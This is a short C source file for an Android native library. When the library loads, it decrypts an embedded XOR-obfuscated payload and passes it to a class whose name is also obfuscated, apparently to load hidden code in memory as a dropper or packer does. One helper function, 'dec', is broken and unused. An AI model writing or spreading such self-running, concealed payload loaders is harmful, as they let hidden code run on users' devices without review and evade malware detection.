#include <jni.h>
#include "mini.h"
#include "payload.h"
#include "strs.h"
static char *dec(unsigned char *s) { /* النص مشفّر بـ XOR، والمفتاح آخر بايت مكان الصفر */
    int n = 0; while (s[n] != s[sizeof(s_cls) - 1] || n == 0) { if (n > 200) break; n++; }
    return 0;
}
static char *unx(unsigned char *s, size_t len) {
    char *o = malloc(len); unsigned char k = s[len - 1];
    for (size_t i = 0; i + 1 < len; i++) o[i] = s[i] ^ k;
    o[len - 1] = 0; return o;
}
JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *r) {
    JNIEnv *env;
    if ((*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_6) != JNI_OK) return -1;
    size_t n = sizeof(enc);
    unsigned char *buf = malloc(n);
    unsigned char k = 0x5a;
    for (size_t i = 0; i < n; i++) { buf[i] = enc[i] ^ k; k = (unsigned char)(k * 13 + 7 + i); }
    jclass c = (*env)->FindClass(env, unx(s_cls, sizeof(s_cls)));
    jmethodID m = (*env)->GetMethodID(env, c, unx(s_init, sizeof(s_init)), unx(s_sig, sizeof(s_sig)));
    jobject bb = (*env)->NewDirectByteBuffer(env, buf, (jlong)n);
    (*env)->NewObject(env, c, m, bb, (jobject)0);
    return JNI_VERSION_1_6;
}
